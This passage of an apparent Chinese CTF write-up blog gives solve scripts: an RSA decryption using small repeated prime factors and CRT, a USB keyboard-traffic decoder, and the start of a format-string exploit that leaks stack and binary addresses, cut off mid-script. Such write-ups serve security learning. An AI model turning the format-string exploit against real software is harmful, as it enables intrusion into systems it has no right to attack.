class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>c = <span class="hljs-number">29259244746260903447574448389058952310000390135231599667104954615635954705912759181552349897154663199516384757779582324312559110410628822220097857204989378367616522573650610718867075518776621505865327181301059226036067398269476892575801933638458560523584293063843890012581096233699743704556897984235725492806550009731913445801481786988321848320254380607620726887530437151238556482879159888862341096974129499878601309077513908335631417136332585391767849651968095851808312565329858938394084369711172343300695636449663297542069122814607488273607842533010193498547579501368165500427762712900139188279259336486273788664239339542187191374015805659616093967428577968683677885747775540903578723024681500272919689849253480672194507905399890280339044782040395397922973935735424691828624724029439840506402735626398047317544972966643810550593849196291833043243448655939654884418027006572740130515844853007135331296523599052132266288322473865775521953742444721612389547052020839760259179074124960827686670217980159612966767064088131176654212504654177367329044762238432531402899949096987765334061101859346928585114984440559379578507872401025874782849854603895110182401204202962118890563473961321104811452539667609870771280348801335004559132482743318366689808669972965573335905879806817618597010442262336079838039317609336210571773187461470707420797827741277982208089496339300646565067740673242728353659143107970717482392927903021102141779217003523105389389513154792904745687959335115429159530013641777064904216646895961910784920181748841104318013067029395394948190384737300533803009402182800702</span><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = [<span class="hljs-number">47890485652059026823698344598447161988085597568251161</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568297951</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568338059</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568363667</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568398337</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568433917</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568484111</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568667099</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568729849</span>]<br>mi = []<br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> n % (<span class="hljs-built_in">int</span>(p)**<span class="hljs-built_in">int</span>(j)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>            mi.append(j-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br>            mi.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(mi)<br><br>n_list = [p_list[i] ** mi[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi))]<br><span class="hljs-comment">#print(n_list)</span><br><span class="hljs-built_in">print</span>(reduce((<span class="hljs-keyword">lambda</span> x, y: x * y), n_list) - n)<br><br>e = <span class="hljs-number">57564</span><br><br>res=[]<br><br><span class="hljs-keyword">for</span> pi <span class="hljs-keyword">in</span> n_list:<br>    d = inverse(<span class="hljs-built_in">int</span>(e//<span class="hljs-number">108</span>),euler_phi(pi))<br>    m = <span class="hljs-built_in">pow</span>(c,d,pi)<br>    res.append(Zmod(pi)(m).nth_root(<span class="hljs-number">108</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">True</span>))<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">for</span> vc <span class="hljs-keyword">in</span> itertools.product(*res):<br>    _c = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> vc]<br>    m = long_to_bytes(<span class="hljs-built_in">int</span>(crt(_c, n_list)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> m:<br>        <span class="hljs-built_in">print</span>(m)<br><br><span class="hljs-comment">#flag&#123;U_ar3_The_K1ng_oF_rand0m_kin9Dom!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>前面是常规键盘流量分析，后面有点野路子。<br><code>tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>发现导出的数据第一列有异常，部分为<code>20</code>，常见的键盘流量分析题目，均为<code>00</code> <code>01</code> <code>02</code>等类型，遂手动将第一列的<code>20</code>改为<code>02</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023hwsummer/3.png"><br>赛博厨子直接梭<br><img src="/mdimg/2023hwsummer/4.png"><br><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">from mypwn <span class="hljs-keyword">import</span> *</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(b<span class="hljs-string">&quot;I need a str: &quot;</span>,<span class="hljs-string">&#x27;EXIT\r%18$p%19$p%21$p&#x27;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">&#x27;0x&#x27;</span>)</span></span><br><span class="hljs-function">ret_addr </span>= <span class="hljs-built_in">leak</span>() - <span class="hljs-number">8</span><br><span class="hljs-built_in">logs</span>(ret_addr)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">leak</span>() - <span class="hljs-number">28</span> - <span 